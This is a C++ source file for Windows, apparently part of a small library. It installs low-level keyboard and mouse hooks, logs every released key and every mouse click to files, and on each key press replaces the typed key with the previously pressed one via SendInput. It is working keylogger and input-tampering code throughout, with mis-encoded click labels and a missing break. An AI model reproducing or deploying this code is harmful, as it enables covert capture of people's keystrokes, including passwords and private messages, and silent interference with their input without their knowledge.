#include "library.h"

fstream file_for_keyboard;
fstream file_for_mouse;
DWORD prev_key = 0x41;

LRESULT CALLBACK hook_for_keyboard(int scan_code, WPARAM wparam, LPARAM lparam)
{
	PKBDLLHOOKSTRUCT parametrs = reinterpret_cast<PKBDLLHOOKSTRUCT>(lparam);
	DWORD code = parametrs->vkCode;
	if (scan_code == HC_ACTION)
	{
		
		switch (wparam)
		{
		case WM_SYSKEYDOWN:
			if (code == 0x1B)
			{
				PostQuitMessage(EXIT_SUCCESS);
			}
			break;

		case WM_KEYDOWN:
			if (code != 0x1B)
			{
				INPUT input;
				input.type = INPUT_KEYBOARD;
				input.ki.time = 0;
				input.ki.wVk = prev_key;
				input.ki.dwFlags = 0;
				SendInput(1, &input, sizeof(input));
				prev_key = code;
				return 1;
			}

		case WM_KEYUP:
			code = code < 97 && code > 65 ? code + ' ' : code;
			file_for_keyboard << static_cast<char>(code) << endl;
		}
	}
	return CallNextHookEx(NULL, scan_code, wparam, lparam);
}

LRESULT CALLBACK hook_for_mouse(int code, WPARAM wparam, LPARAM lparam)
{
	if (code >= 0)
	{
		switch (wparam)
		{
		case WM_LBUTTONDOWN:
			file_for_mouse << "ÏÊÌ" << endl;
			break;

		case WM_RBUTTONDOWN:
			file_for_mouse << "ËÊÌ " << endl;
			break;
		}
	}
	return CallNextHookEx(NULL, code, wparam, lparam);
}

bool open_file_for_keyboard(const char *name_file)
{
	file_for_keyboard.open(name_file, ios::out);
	return file_for_keyboard.is_open();
}

bool open_file_for_mouse(const char *name_file)
{
	file_for_mouse.open(name_file, ios::out);
	return file_for_mouse.is_open();
}

void close_file()
{
	if (file_for_keyboard.is_open())
	{
		file_for_keyboard.close();
	}
	if (file_for_mouse.is_open())
	{
		file_for_mouse.close();
	}
}